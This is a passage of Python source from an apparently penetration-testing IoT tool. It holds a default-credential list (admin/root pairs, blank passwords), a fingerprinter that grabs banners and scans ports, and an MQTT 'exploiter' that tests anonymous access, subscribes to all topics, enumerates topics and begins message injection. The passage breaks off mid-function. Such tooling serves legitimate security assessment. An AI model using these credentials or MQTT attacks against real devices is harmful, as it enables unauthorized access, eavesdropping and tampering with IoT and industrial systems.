            ("Generic", "admin", "admin", "Generic Device", "unknown", ["http"]),
            ("Generic", "admin", "password", "Generic Device", "unknown", ["http"]),
            ("Generic", "admin", "1234", "Generic Device", "unknown", ["http"]),
            ("Generic", "admin", "12345", "Generic Device", "unknown", ["http"]),
            ("Generic", "admin", "123456", "Generic Device", "unknown", ["http"]),
            ("Generic", "admin", "", "Generic Device", "unknown", ["http"]),
            ("Generic", "root", "root", "Linux Embedded", "unknown", ["ssh", "telnet"]),
            ("Generic", "root", "toor", "BSD Embedded", "unknown", ["ssh"]),
            ("Generic", "root", "", "No Password", "unknown", ["ssh", "telnet"]),
            ("Generic", "user", "user", "Generic User", "unknown", ["http"]),
            ("Generic", "guest", "guest", "Guest Account", "unknown", ["http"]),
            ("Generic", "test", "test", "Test Account", "unknown", ["http"]),
            ("Generic", "debug", "debug", "Debug Access", "unknown", ["telnet"]),
            ("Generic", "service", "service", "Service Account", "unknown", ["ssh"]),
            ("Generic", "support", "support", "Support Account", "unknown", ["http"]),
            ("Generic", "supervisor", "supervisor", "Supervisor", "unknown", ["http"]),
            ("Generic", "default", "default", "Factory Default", "unknown", ["http"]),
        ]

        with self._lock:
            for idx, (vendor, user, passwd, device, cat, protos) in enumerate(raw):
                entry = {
                    "vendor": vendor,
                    "username": user,
                    "password": passwd,
                    "device": device,
                    "category": cat,
                    "protocols": protos,
                }
                self._credentials.append(entry)
                self._vendor_index[vendor.lower()].append(idx)
                self._category_index[cat.lower()].append(idx)

        logger.debug("DefaultCredDB loaded %d credentials", len(self._credentials))

    def get_all_credentials(self) -> List[Dict[str, Any]]:
        """Return all credentials."""
        with self._lock:
            return list(self._credentials)

    def get_credentials_for_vendor(self, vendor: str) -> List[Dict[str, Any]]:
        """Return credentials matching a vendor name (case-insensitive partial match)."""
        with self._lock:
            results: List[Dict[str, Any]] = []
            vendor_lower = vendor.lower()
            for v_key, indices in self._vendor_index.items():
                if vendor_lower in v_key or v_key in vendor_lower:
                    for idx in indices:
                        results.append(self._credentials[idx])
            return results

    def get_credentials_for_category(self, category: str) -> List[Dict[str, Any]]:
        """Return credentials matching a device category."""
        with self._lock:
            cat_lower = category.lower()
            indices = self._category_index.get(cat_lower, [])
            return [self._credentials[idx] for idx in indices]

    def get_credentials_for_protocol(self, protocol: str) -> List[Dict[str, Any]]:
        """Return credentials for devices using a specific protocol."""
        with self._lock:
            proto_lower = protocol.lower()
            return [c for c in self._credentials if proto_lower in c["protocols"]]

    def search(self, query: str) -> List[Dict[str, Any]]:
        """Full-text search across all credential fields."""
        with self._lock:
            q = query.lower()
            return [
                c for c in self._credentials
                if q in c["vendor"].lower()
                or q in c["username"].lower()
                or q in c["device"].lower()
                or q in c["category"].lower()
            ]

    def credential_count(self) -> int:
        """Return total number of credentials."""
        with self._lock:
            return len(self._credentials)

    def vendor_list(self) -> List[str]:
        """Return sorted list of unique vendors."""
        with self._lock:
            return sorted(set(c["vendor"] for c in self._credentials))

    def to_dict(self) -> Dict[str, Any]:
        """Serialize the database."""
        with self._lock:
            return {
                "total_credentials": len(self._credentials),
                "vendors": self.vendor_list(),
                "credentials": self._credentials,
            }


# ════════════════════════════════════════════════════════════════════════════════
# IoT FINGERPRINTER
# ════════════════════════════════════════════════════════════════════════════════

class IoTFingerprinter:
    """
    Multi-technique IoT device fingerprinter.

    Combines banner grabbing, HTTP header analysis, and MAC OUI lookup
    to identify device vendor, model, firmware version, and category.

    Usage:
        fp = IoTFingerprinter()
        device = fp.fingerprint_host("192.168.1.100", ports=[80, 443, 8080])
    """

    # 50+ MAC OUI prefixes mapped to vendors
    MAC_OUI_DB: Dict[str, str] = {
        "00:40:8C": "Axis",
        "AC:CC:8E": "Axis",
        "B8:A4:4F": "Axis",
        "00:80:F0": "Panasonic",
        "08:00:46": "Panasonic",
        "34:D2:70": "Panasonic",
        "28:6D:97": "Hikvision",
        "C0:56:E3": "Hikvision",
        "44:19:B6": "Hikvision",
        "54:C4:15": "Hikvision",
        "E0:50:8B": "Hikvision",
        "BC:AD:28": "Hikvision",
        "A4:14:37": "Dahua",
        "3C:EF:8C": "Dahua",
        "40:F4:EC": "Dahua",
        "B0:C5:CA": "D-Link",
        "1C:7E:E5": "D-Link",
        "28:10:7B": "D-Link",
        "C0:A0:BB": "D-Link",
        "14:D6:4D": "D-Link",
        "C4:E9:84": "TP-Link",
        "50:C7:BF": "TP-Link",
        "60:32:B1": "TP-Link",
        "AC:84:C6": "TP-Link",
        "30:B5:C2": "TP-Link",
        "20:4E:7F": "Netgear",
        "A4:2B:8C": "Netgear",
        "6C:B0:CE": "Netgear",
        "C4:3D:C7": "Netgear",
        "18:E8:29": "Ubiquiti",
        "24:A4:3C": "Ubiquiti",
        "44:D9:E7": "Ubiquiti",
        "78:8A:20": "Ubiquiti",
        "B4:FB:E4": "Ubiquiti",
        "F0:9F:C2": "Ubiquiti",
        "00:17:C5": "Cisco",
        "00:1B:D4": "Cisco",
        "00:26:CB": "Cisco",
        "58:AC:78": "Cisco",
        "D8:B1:90": "Cisco",
        "08:00:06": "Siemens",
        "00:0E:8C": "Siemens",
        "4C:EB:42": "Siemens",
        "00:80:F4": "Schneider",
        "00:20:D6": "Schneider",
        "F8:B1:56": "Samsung",
        "00:07:AB": "Samsung",
        "00:1E:E5": "Cisco/Linksys",
        "00:23:69": "Cisco/Linksys",
        "00:1F:33": "Netgear",
        "00:09:0F": "Fortinet",
        "00:1A:8C": "Sophos",
        "E4:95:6E": "IEEE",
        "00:0B:82": "Grandstream",
        "00:0B:86": "Aruba",
        "00:50:56": "VMware",
        "00:0C:29": "VMware",
        "70:B3:D5": "Moxa",
        "00:90:E8": "Moxa",
        "00:30:11": "Honeywell",
        "00:E0:C9": "Bosch",
    }

    # HTTP header patterns for device identification
    HTTP_FINGERPRINTS: List[Tuple[str, str, str, str]] = [
        # (header_field, pattern, vendor, category)
        ("Server", r"Hikvision", "Hikvision", "camera"),
        ("Server", r"DVRDVS-Webs", "Hikvision", "dvr_nvr"),
        ("Server", r"Dahua", "Dahua", "camera"),
        ("Server", r"DH-NVR", "Dahua", "dvr_nvr"),
        ("Server", r"mini_httpd.*Axis", "Axis", "camera"),
        ("Server", r"AXIS", "Axis", "camera"),
        ("Server", r"TP-LINK", "TP-Link", "router"),
        ("Server", r"NETGEAR", "Netgear", "router"),
        ("Server", r"D-Link", "D-Link", "router"),
        ("Server", r"Boa.*Vivotek", "Vivotek", "camera"),
        ("Server", r"lighttpd.*Ubiquiti", "Ubiquiti", "access_point"),
        ("Server", r"MikroTik", "MikroTik", "router"),
        ("Server", r"Cisco", "Cisco", "router"),
        ("Server", r"GoAhead-Webs", "GoAhead", "camera"),
        ("Server", r"thttpd", "Generic", "camera"),
        ("Server", r"uhttpd", "OpenWrt", "router"),
        ("Server", r"RomPager", "Allegro", "router"),
        ("Server", r"mini_httpd", "ACME", "camera"),
        ("Server", r"Boa/", "Boa", "camera"),
        ("Server", r"JNAP", "Linksys", "router"),
        ("WWW-Authenticate", r"Hikvision", "Hikvision", "camera"),
        ("WWW-Authenticate", r"Dahua", "Dahua", "camera"),
        ("WWW-Authenticate", r"AXIS", "Axis", "camera"),
        ("X-Powered-By", r"Niagara", "Tridium", "building_mgmt"),
        ("X-Powered-By", r"Express", "Generic", "gateway"),
        ("Content-Type", r"SCADA", "Generic", "scada_server"),
    ]

    # Banner patterns for service identification
    BANNER_FINGERPRINTS: List[Tuple[str, str, str]] = [
        (r"SSH.*dropbear", "Dropbear SSH", "gateway"),
        (r"SSH.*OpenSSH", "OpenSSH", "unknown"),
        (r"220.*FTP", "FTP Server", "unknown"),
        (r"220.*ProFTPD", "ProFTPD", "unknown"),
        (r"220.*vsftpd", "vsftpd", "unknown"),
        (r"Telnet.*BusyBox", "BusyBox Telnet", "gateway"),
        (r"login:.*BusyBox", "BusyBox", "gateway"),
        (r"RTSP/1\.0", "RTSP Camera", "camera"),
        (r"SIP/2\.0", "SIP Phone", "voip_phone"),
        (r"Modbus/TCP", "Modbus Device", "plc"),
        (r"S7comm", "Siemens S7", "plc"),
        (r"BACnet", "BACnet Device", "building_mgmt"),
        (r"MQTT", "MQTT Broker", "gateway"),
        (r"EtherNet/IP", "EtherNet/IP Device", "plc"),
        (r"DNP3", "DNP3 Outstation", "rtu"),
        (r"FINS", "Omron FINS", "plc"),
        (r"MelsecQ", "Mitsubishi PLC", "plc"),
        (r"OPC UA", "OPC UA Server", "scada_server"),
    ]

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._oui_cache: Dict[str, str] = {}
        self._fingerprint_cache: Dict[str, IoTDevice] = {}
        logger.info("IoTFingerprinter initialized")

    def _normalize_mac(self, mac: str) -> str:
        """Normalize MAC address to XX:XX:XX:XX:XX:XX format."""
        mac = re.sub(r"[^0-9a-fA-F]", "", mac)
        if len(mac) == 12:
            return ":".join(mac[i:i+2].upper() for i in range(0, 12, 2))
        return mac.upper()

    def lookup_oui(self, mac: str) -> str:
        """Look up vendor from MAC OUI prefix."""
        with self._lock:
            normalized = self._normalize_mac(mac)
            if normalized in self._oui_cache:
                return self._oui_cache[normalized]

            oui = normalized[:8].upper()
            vendor = self.MAC_OUI_DB.get(oui, "")
            self._oui_cache[normalized] = vendor
            return vendor

    def grab_banner(self, host: str, port: int, timeout: float = DEFAULT_TIMEOUT) -> str:
        """Grab service banner from a TCP port."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                sock.connect((host, port))

                # Some services send banner immediately
                try:
                    banner = sock.recv(MAX_BANNER_SIZE).decode("utf-8", errors="replace")
                    if banner.strip():
                        return banner.strip()
                except socket.timeout:
                    pass

                # Try sending a probe for HTTP
                if port in (80, 443, 8080, 8443, 8000, 8888):
                    probe = f"GET / HTTP/1.0\r\nHost: {host}\r\n\r\n"
                    sock.sendall(probe.encode())
                    try:
                        response = sock.recv(MAX_BANNER_SIZE).decode("utf-8", errors="replace")
                        return response.strip()
                    except socket.timeout:
                        pass

                # Try CRLF probe for telnet/FTP
                if port in (21, 23, 2323):
                    sock.sendall(b"\r\n")
                    try:
                        banner = sock.recv(MAX_BANNER_SIZE).decode("utf-8", errors="replace")
                        return banner.strip()
                    except socket.timeout:
                        pass

                # Try RTSP OPTIONS
                if port in (554, 8554):
                    probe = f"OPTIONS rtsp://{host}:{port}/ RTSP/1.0\r\nCSeq: 1\r\n\r\n"
                    sock.sendall(probe.encode())
                    try:
                        response = sock.recv(MAX_BANNER_SIZE).decode("utf-8", errors="replace")
                        return response.strip()
                    except socket.timeout:
                        pass

                return ""
        except (OSError, ConnectionError) as e:
            logger.debug("Banner grab failed for %s:%d: %s", host, port, e)
            return ""

    def analyze_http_headers(self, headers: Dict[str, str]) -> Tuple[str, str]:
        """Analyze HTTP response headers to identify vendor and category."""
        for header_field, pattern, vendor, category in self.HTTP_FINGERPRINTS:
            value = headers.get(header_field, "")
            if value and re.search(pattern, value, re.IGNORECASE):
                return vendor, category
        return "", ""

    def analyze_banner(self, banner: str) -> Tuple[str, str]:
        """Analyze a service banner to identify service and category."""
        for pattern, service_name, category in self.BANNER_FINGERPRINTS:
            if re.search(pattern, banner, re.IGNORECASE):
                return service_name, category
        return "", ""

    def extract_http_headers(self, raw_response: str) -> Dict[str, str]:
        """Extract HTTP headers from a raw response."""
        headers: Dict[str, str] = {}
        lines = raw_response.split("\r\n")
        if not lines:
            lines = raw_response.split("\n")

        for line in lines[1:]:
            if ":" in line:
                key, _, value = line.partition(":")
                headers[key.strip()] = value.strip()
            elif line.strip() == "":
                break

        return headers

    def _detect_category(self, vendor: str, ports: List[int],
                         banners: Dict[int, str]) -> DeviceCategory:
        """Heuristic category detection based on vendor, ports, and banners."""
        cat_map: Dict[str, DeviceCategory] = {
            "camera": DeviceCategory.CAMERA,
            "router": DeviceCategory.ROUTER,
            "switch": DeviceCategory.SWITCH,
            "access_point": DeviceCategory.ACCESS_POINT,
            "plc": DeviceCategory.PLC,
            "hmi": DeviceCategory.HMI,
            "rtu": DeviceCategory.RTU,
            "scada_server": DeviceCategory.SCADA_SERVER,
            "gateway": DeviceCategory.GATEWAY,
            "building_mgmt": DeviceCategory.BUILDING_MGMT,
            "hvac": DeviceCategory.HVAC,
            "printer": DeviceCategory.PRINTER,
            "nas": DeviceCategory.NAS,
            "voip_phone": DeviceCategory.VOIP_PHONE,
            "dvr_nvr": DeviceCategory.DVR_NVR,
            "smart_plug": DeviceCategory.SMART_PLUG,
            "smart_light": DeviceCategory.SMART_LIGHT,
            "thermostat": DeviceCategory.THERMOSTAT,
            "smart_lock": DeviceCategory.SMART_LOCK,
            "fire_panel": DeviceCategory.FIRE_PANEL,
            "smart_meter": DeviceCategory.SMART_METER,
            "industrial_robot": DeviceCategory.INDUSTRIAL_ROBOT,
            "actuator": DeviceCategory.ACTUATOR,
            "sensor": DeviceCategory.SENSOR,
            "unknown": DeviceCategory.UNKNOWN,
        }

        # Check banners for category hints
        for _port, banner in banners.items():
            _, cat_str = self.analyze_banner(banner)
            if cat_str and cat_str in cat_map:
                return cat_map[cat_str]

        # Port-based heuristics
        if 554 in ports or 8554 in ports:
            return DeviceCategory.CAMERA
        if 502 in ports:
            return DeviceCategory.PLC
        if 47808 in ports:
            return DeviceCategory.BUILDING_MGMT
        if 9100 in ports or 631 in ports:
            return DeviceCategory.PRINTER
        if 5060 in ports or 5061 in ports:
            return DeviceCategory.VOIP_PHONE

        return DeviceCategory.UNKNOWN

    def _detect_protocols(self, ports: List[int]) -> List[IoTProtocol]:
        """Detect likely protocols from open ports."""
        port_proto_map: Dict[int, IoTProtocol] = {
            80: IoTProtocol.HTTP,
            443: IoTProtocol.HTTPS,
            1883: IoTProtocol.MQTT,
            8883: IoTProtocol.MQTT,
            5683: IoTProtocol.COAP,
            1900: IoTProtocol.UPNP,
            502: IoTProtocol.MODBUS,
            47808: IoTProtocol.BACNET,
            5672: IoTProtocol.AMQP,
            23: IoTProtocol.TELNET,
            22: IoTProtocol.SSH,
            21: IoTProtocol.FTP,
            554: IoTProtocol.RTSP,
            8080: IoTProtocol.HTTP,
            8443: IoTProtocol.HTTPS,
            2323: IoTProtocol.TELNET,
        }

        protocols: List[IoTProtocol] = []
        seen: Set[IoTProtocol] = set()
        for port in ports:
            proto = port_proto_map.get(port)
            if proto and proto not in seen:
                protocols.append(proto)
                seen.add(proto)

        return protocols

    def fingerprint_host(self, host: str, ports: Optional[List[int]] = None,
                         mac: str = "", timeout: float = DEFAULT_TIMEOUT) -> IoTDevice:
        """
        Perform full fingerprinting of a host.

        Combines banner grabbing, HTTP header analysis, and MAC OUI
        lookup to build a comprehensive device profile.
        """
        with self._lock:
            cache_key = f"{host}:{','.join(str(p) for p in (ports or []))}"
            if cache_key in self._fingerprint_cache:
                return self._fingerprint_cache[cache_key]

        if ports is None:
            ports = [21, 22, 23, 80, 443, 502, 554, 1883, 5672, 5683,
                     8080, 8443, 8883, 47808]

        device = IoTDevice(ip_address=host, mac_address=mac)
        banners: Dict[int, str] = {}
        http_headers: Dict[str, str] = {}
        vendor = ""
        category_str = ""

        # MAC OUI lookup
        if mac:
            vendor = self.lookup_oui(mac)
            if vendor:
                device.vendor = vendor

        # Banner grabbing on each port
        for port in ports:
            banner = self.grab_banner(host, port, timeout)
            if banner:
                banners[port] = banner
                device.open_ports.append(port)

                # Extract HTTP headers if applicable
                if banner.startswith("HTTP/"):
                    hdrs = self.extract_http_headers(banner)
                    http_headers.update(hdrs)
                    device.http_headers.update(hdrs)

                    v, c = self.analyze_http_headers(hdrs)
                    if v and not vendor:
                        vendor = v
                    if c and not category_str:
                        category_str = c

                # Analyze banner
                svc, cat = self.analyze_banner(banner)
                if svc:
                    device.services[port] = svc
                if cat and not category_str:
                    category_str = cat

                # Extract firmware version from banner
                fw_match = re.search(
                    r"(?:firmware|version|fw|ver)[:\s]*([0-9]+\.[0-9]+\.[0-9]+[^\s]*)",
                    banner, re.IGNORECASE
                )
                if fw_match and not device.firmware_version:
                    device.firmware_version = fw_match.group(1)

        device.banners = banners
        if vendor:
            device.vendor = vendor

        # Detect category and protocols
        device.category = self._detect_category(vendor, device.open_ports, banners)
        device.protocols = self._detect_protocols(device.open_ports)

        with self._lock:
            self._fingerprint_cache[cache_key] = device

        logger.info("Fingerprinted %s: vendor=%s category=%s ports=%s",
                     host, device.vendor, device.category.name, device.open_ports)
        return device

    def quick_scan_port(self, host: str, port: int,
                        timeout: float = 2.0) -> bool:
        """Quick TCP connect scan to check if a port is open."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(timeout)
                result = sock.connect_ex((host, port))
                return result == 0
        except OSError:
            return False

    def discover_ports(self, host: str, port_list: Optional[List[int]] = None,
                       timeout: float = 2.0) -> List[int]:
        """Discover open ports on a host."""
        if port_list is None:
            port_list = [
                21, 22, 23, 25, 53, 80, 102, 161, 443, 502, 554, 631,
                1433, 1883, 2222, 2323, 3306, 3389, 4840, 5060, 5432,
                5672, 5683, 8000, 8080, 8443, 8554, 8883, 9100, 9200,
                20000, 44818, 47808, 48898, 49152,
            ]
        open_ports: List[int] = []
        for port in port_list:
            if self.quick_scan_port(host, port, timeout):
                open_ports.append(port)
        return open_ports

    def to_dict(self) -> Dict[str, Any]:
        """Serialize fingerprinter state."""
        with self._lock:
            return {
                "oui_entries": len(self.MAC_OUI_DB),
                "http_fingerprints": len(self.HTTP_FINGERPRINTS),
                "banner_fingerprints": len(self.BANNER_FINGERPRINTS),
                "cached_hosts": len(self._fingerprint_cache),
            }


# ════════════════════════════════════════════════════════════════════════════════
# MQTT EXPLOITER
# ════════════════════════════════════════════════════════════════════════════════

class MQTTExploiter:
    """
    MQTT protocol exploitation engine.

    Tests MQTT brokers for authentication bypass, wildcard subscription,
    topic enumeration, message injection, QoS abuse, will message
    exploitation, and credential brute-forcing.

    Usage:
        mqtt = MQTTExploiter()
        findings = mqtt.full_test("192.168.1.100")
    """

    # Common MQTT topics to enumerate
    COMMON_TOPICS: List[str] = [
        "#", "$SYS/#", "$SYS/broker/version", "$SYS/broker/uptime",
        "$SYS/broker/clients/connected", "$SYS/broker/messages/received",
        "$SYS/broker/messages/sent", "$SYS/broker/subscriptions/count",
        "$SYS/broker/load/#", "home/#", "device/#", "sensor/#",
        "actuator/#", "control/#", "cmd/#", "command/#", "status/#",
        "telemetry/#", "data/#", "alert/#", "alarm/#", "config/#",
        "firmware/#", "update/#", "ota/#", "zigbee2mqtt/#",
        "homeassistant/#", "tasmota/#", "shellies/#", "tele/#",
        "stat/#", "cmnd/#", "esphome/#", "owntracks/#",
        "frigate/#", "valetudo/#", "zwave/#", "bt-mqtt-gateway/#",
        "iot/#", "factory/#", "plant/#", "machine/#", "scada/#",
        "plc/#", "modbus/#", "opcua/#", "building/#", "hvac/#",
        "energy/#", "power/#", "water/#", "gas/#", "temperature/#",
        "humidity/#", "pressure/#", "motion/#", "door/#", "lock/#",
        "camera/#", "light/#", "switch/#", "outlet/#",
    ]

    def __init__(self, timeout: float = DEFAULT_TIMEOUT) -> None:
        self._lock = threading.RLock()
        self._timeout = timeout
        self._findings: List[IoTFinding] = []
        self._subscribed_topics: Dict[str, List[bytes]] = defaultdict(list)
        self._message_count = 0
        self._connected = False
        logger.info("MQTTExploiter initialized")

    def _build_connect_packet(self, client_id: str = "",
                               username: str = "", password: str = "",
                               will_topic: str = "", will_message: str = "",
                               will_qos: int = 0, will_retain: bool = False,
                               clean_session: bool = True,
                               keep_alive: int = 60) -> bytes:
        """Build an MQTT CONNECT packet (v3.1.1)."""
        if not client_id:
            client_id = f"siren-{uuid.uuid4().hex[:8]}"

        # Variable header
        protocol_name = b"\x00\x04MQTT"
        protocol_level = b"\x04"  # MQTT 3.1.1

        # Connect flags
        flags = 0
        if clean_session:
            flags |= 0x02
        if will_topic:
            flags |= 0x04
            flags |= (will_qos & 0x03) << 3
            if will_retain:
                flags |= 0x20
        if password:
            flags |= 0x40
        if username:
            flags |= 0x80

        connect_flags = bytes([flags])
        keep_alive_bytes = struct.pack("!H", keep_alive)

        variable_header = protocol_name + protocol_level + connect_flags + keep_alive_bytes

        # Payload
        payload = struct.pack("!H", len(client_id)) + client_id.encode("utf-8")

        if will_topic:
            payload += struct.pack("!H", len(will_topic)) + will_topic.encode("utf-8")
            will_msg_bytes = will_message.encode("utf-8")
            payload += struct.pack("!H", len(will_msg_bytes)) + will_msg_bytes

        if username:
            payload += struct.pack("!H", len(username)) + username.encode("utf-8")
        if password:
            pwd_bytes = password.encode("utf-8")
            payload += struct.pack("!H", len(pwd_bytes)) + pwd_bytes

        # Fixed header
        remaining = variable_header + payload
        remaining_length = self._encode_remaining_length(len(remaining))
        fixed_header = bytes([MQTTPacketType.CONNECT << 4]) + remaining_length

        return fixed_header + remaining

    def _build_subscribe_packet(self, packet_id: int, topic: str,
                                 qos: int = 0) -> bytes:
        """Build an MQTT SUBSCRIBE packet."""
        variable_header = struct.pack("!H", packet_id)
        payload = struct.pack("!H", len(topic)) + topic.encode("utf-8") + bytes([qos])
        remaining = variable_header + payload
        remaining_length = self._encode_remaining_length(len(remaining))
        fixed_header = bytes([MQTTPacketType.SUBSCRIBE << 4 | 0x02]) + remaining_length
        return fixed_header + remaining

    def _build_publish_packet(self, topic: str, message: bytes,
                               qos: int = 0, retain: bool = False,
                               packet_id: int = 1) -> bytes:
        """Build an MQTT PUBLISH packet."""
        flags = MQTTPacketType.PUBLISH << 4
        if retain:
            flags |= 0x01
        flags |= (qos & 0x03) << 1

        variable_header = struct.pack("!H", len(topic)) + topic.encode("utf-8")
        if qos > 0:
            variable_header += struct.pack("!H", packet_id)

        remaining = variable_header + message
        remaining_length = self._encode_remaining_length(len(remaining))
        fixed_header = bytes([flags]) + remaining_length
        return fixed_header + remaining

    def _build_pingreq_packet(self) -> bytes:
        """Build MQTT PINGREQ packet."""
        return bytes([MQTTPacketType.PINGREQ << 4, 0x00])

    def _build_disconnect_packet(self) -> bytes:
        """Build MQTT DISCONNECT packet."""
        return bytes([MQTTPacketType.DISCONNECT << 4, 0x00])

    def _encode_remaining_length(self, length: int) -> bytes:
        """Encode MQTT remaining length field."""
        result = bytearray()
        while True:
            encoded_byte = length % 128
            length = length // 128
            if length > 0:
                encoded_byte |= 0x80
            result.append(encoded_byte)
            if length == 0:
                break
        return bytes(result)

    def _decode_remaining_length(self, data: bytes, offset: int = 1) -> Tuple[int, int]:
        """Decode MQTT remaining length, returning (length, bytes_consumed)."""
        multiplier = 1
        value = 0
        idx = offset
        while idx < len(data):
            encoded_byte = data[idx]
            value += (encoded_byte & 0x7F) * multiplier
            multiplier *= 128
            idx += 1
            if (encoded_byte & 0x80) == 0:
                break
        return value, idx - offset

    def _parse_connack(self, data: bytes) -> Tuple[bool, int]:
        """Parse CONNACK response. Returns (session_present, return_code)."""
        if len(data) < 4:
            return False, -1
        pkt_type = (data[0] >> 4) & 0x0F
        if pkt_type != MQTTPacketType.CONNACK:
            return False, -1
        session_present = bool(data[2] & 0x01)
        return_code = data[3]
        return session_present, return_code

    def _parse_suback(self, data: bytes) -> Tuple[int, List[int]]:
        """Parse SUBACK response. Returns (packet_id, granted_qos_list)."""
        if len(data) < 5:
            return 0, []
        _rem_len, consumed = self._decode_remaining_length(data, 1)
        offset = 1 + consumed
        packet_id = struct.unpack("!H", data[offset:offset+2])[0]
        offset += 2
        granted_qos = list(data[offset:])
        return packet_id, granted_qos

    def _parse_publish(self, data: bytes) -> Tuple[str, bytes, int]:
        """Parse a PUBLISH message. Returns (topic, payload, qos)."""
        if len(data) < 4:
            return "", b"", 0

        flags = data[0]
        qos = (flags >> 1) & 0x03
        rem_len, consumed = self._decode_remaining_length(data, 1)
        offset = 1 + consumed

        topic_len = struct.unpack("!H", data[offset:offset+2])[0]
        offset += 2
        topic = data[offset:offset+topic_len].decode("utf-8", errors="replace")
        offset += topic_len

        if qos > 0:
            offset += 2  # skip packet_id

        payload = data[offset:1+consumed+rem_len]
        return topic, payload, qos

    def connect(self, host: str, port: int = MQTT_DEFAULT_PORT,
                username: str = "", password: str = "") -> Tuple[bool, int]:
        """
        Attempt MQTT connection.

        Returns (success, return_code):
          0 = Connection Accepted
          1 = Unacceptable Protocol Version
          2 = Identifier Rejected
          3 = Server Unavailable
          4 = Bad Username/Password
          5 = Not Authorized
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            pkt = self._build_connect_packet(username=username, password=password)
            sock.sendall(pkt)

            resp = sock.recv(4096)
            session_present, rc = self._parse_connack(resp)

            if rc == 0:
                self._connected = True
                logger.info("MQTT connected to %s:%d (user=%s)", host, port, username or "<anon>")
            else:
                logger.debug("MQTT connect refused: %s:%d rc=%d", host, port, rc)

            sock.sendall(self._build_disconnect_packet())
            sock.close()
            return rc == 0, rc

        except (OSError, ConnectionError, struct.error) as e:
            logger.debug("MQTT connect failed %s:%d: %s", host, port, e)
            return False, -1

    def test_anonymous_access(self, host: str,
                               port: int = MQTT_DEFAULT_PORT) -> IoTFinding:
        """Test if MQTT broker allows anonymous connections."""
        success, rc = self.connect(host, port)
        if success:
            finding = IoTFinding(
                finding_type=FindingType.MQTT_NO_AUTH,
                severity=Severity.CRITICAL,
                title="MQTT Broker Allows Anonymous Access",
                description=(
                    f"MQTT broker at {host}:{port} accepts connections without "
                    "authentication. Any client can subscribe to all topics and "
                    "publish arbitrary messages."
                ),
                target=host,
                port=port,
                protocol=IoTProtocol.MQTT,
                evidence=f"CONNACK return_code=0 (accepted) with no credentials",
                remediation=(
                    "Enable authentication on the MQTT broker. Configure ACLs "
                    "to restrict topic access. Use TLS for transport encryption."
                ),
                cvss_score=9.8,
                confidence=1.0,
            )
            with self._lock:
                self._findings.append(finding)
            return finding

        return IoTFinding(
            finding_type=FindingType.INFO_DISCLOSURE,
            severity=Severity.INFO,
            title="MQTT Broker Requires Authentication",
            description=f"MQTT broker at {host}:{port} requires credentials (rc={rc}).",
            target=host,
            port=port,
            protocol=IoTProtocol.MQTT,
            confidence=1.0,
        )

    def subscribe_wildcard(self, host: str, port: int = MQTT_DEFAULT_PORT,
                            username: str = "", password: str = "",
                            duration: float = 10.0) -> List[Tuple[str, bytes]]:
        """Subscribe to # (all topics) and collect messages."""
        messages: List[Tuple[str, bytes]] = []
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._timeout)
            sock.connect((host, port))

            pkt = self._build_connect_packet(username=username, password=password)
            sock.sendall(pkt)
            resp = sock.recv(4096)
            _, rc = self._parse_connack(resp)
            if rc != 0:
                sock.close()
                return messages

            # Subscribe to #
            sub_pkt = self._build_subscribe_packet(1, "#", qos=0)
            sock.sendall(sub_pkt)
            resp = sock.recv(4096)

            # Collect messages for the specified duration
            end_time = time.time() + duration
            sock.settimeout(1.0)

            while time.time() < end_time:
                try:
                    data = sock.recv(8192)
                    if not data:
                        break
                    pkt_type = (data[0] >> 4) & 0x0F
                    if pkt_type == MQTTPacketType.PUBLISH:
                        topic, payload, _qos = self._parse_publish(data)
                        if topic:
                            messages.append((topic, payload))
                            with self._lock:
                                self._subscribed_topics[topic].append(payload)
                                self._message_count += 1
                    elif pkt_type == MQTTPacketType.PINGREQ:
                        sock.sendall(bytes([MQTTPacketType.PINGRESP << 4, 0x00]))
                except socket.timeout:
                    continue

            sock.sendall(self._build_disconnect_packet())
            sock.close()

            if messages:
                finding = IoTFinding(
                    finding_type=FindingType.MQTT_WILDCARD_SUB,
                    severity=Severity.HIGH,
                    title="MQTT Wildcard Subscription Allowed",
                    description=(
                        f"Successfully subscribed to '#' on {host}:{port}. "
                        f"Received {len(messages)} messages across "
                        f"{len(set(t for t, _ in messages))} topics."
                    ),
                    target=host,
                    port=port,
                    protocol=IoTProtocol.MQTT,
                    evidence=f"Topics: {list(set(t for t, _ in messages))[:20]}",
                    remediation="Implement topic-level ACLs to restrict subscriptions.",
                    cvss_score=7.5,
                    confidence=1.0,
                )
                with self._lock:
                    self._findings.append(finding)

        except (OSError, ConnectionError) as e:
            logger.debug("Wildcard subscribe failed %s:%d: %s", host, port, e)

        return messages

    def enumerate_topics(self, host: str, port: int = MQTT_DEFAULT_PORT,
                          username: str = "", password: str = "",
                          timeout_per_topic: float = 3.0) -> List[str]:
        """Enumerate active topics by subscribing to common patterns."""
        discovered: List[str] = []

        for topic_pattern in self.COMMON_TOPICS:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self._timeout)
                sock.connect((host, port))

                pkt = self._build_connect_packet(username=username, password=password)
                sock.sendall(pkt)
                resp = sock.recv(4096)
                _, rc = self._parse_connack(resp)
                if rc != 0:
                    sock.close()
                    continue

                sub_pkt = self._build_subscribe_packet(1, topic_pattern, qos=0)
                sock.sendall(sub_pkt)
                resp = sock.recv(4096)
                _pid, granted = self._parse_suback(resp)

                # Check if subscription was granted
                if granted and granted[0] != 0x80:
                    discovered.append(topic_pattern)

                    # Try to receive a message
                    sock.settimeout(timeout_per_topic)
                    try:
                        data = sock.recv(8192)
                        if data:
                            pkt_type = (data[0] >> 4) & 0x0F
                            if pkt_type == MQTTPacketType.PUBLISH:
                                topic, payload, _ = self._parse_publish(data)
                                if topic and topic not in discovered:
                                    discovered.append(topic)
                    except socket.timeout:
                        pass

                sock.sendall(self._build_disconnect_packet())
                sock.close()

            except (OSError, ConnectionError):
                continue

        logger.info("Enumerated %d MQTT topics on %s:%d", len(discovered), host, port)
        return discovered

    def publish_inject(self, host: str, topic: str, message: bytes,
                        port: int = MQTT_DEFAULT_PORT,
                        username: str = "", password: str = "",
                        qos: int = 0, retain: bool = False) -> bool:
        """Attempt to publish a message to a topic (injection test)."""
        try:
